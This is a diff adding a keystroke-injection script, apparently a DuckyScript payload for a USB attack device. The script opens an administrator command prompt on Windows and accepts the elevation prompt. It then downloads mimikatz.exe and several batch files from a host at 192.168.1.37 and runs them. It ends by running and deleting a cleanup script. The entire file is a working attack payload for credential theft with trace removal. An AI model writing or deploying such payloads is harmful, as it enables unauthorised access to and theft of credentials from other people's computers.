@@ -1,0 +1,38 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+CTRL SHIFT ENTER
+DELAY 2500
+ALT y
+DELAY 1000
+STRING cd /
+ENTER
+DELAY 1000
+STRING curl http://192.168.1.37:8000/mimikatz.exe --output C:/mimikatz.exe
+ENTER
+DELAY 500
+STRING curl http://192.168.1.37:8000/clean.bat --output C:/clean.bat
+ENTER
+DELAY 500
+STRING curl http://192.168.1.37:8000/Scan.bat --output C:/scan.bat
+ENTER
+DELAY 500
+STRING scan.bat
+ENTER
+DELAY 1000
+STRING curl http://192.168.1.37:8000/main.bat --output C:/main.bat
+ENTER
+DELAY 500
+STRING main.bat
+ENTER
+DELAY 1000
+STRING clean.bat
+ENTER
+DELAY 1000
+STRING del clean.bat
+ENTER
+DELAY 500
+STRING exit
+ENTER
+DELAY 500
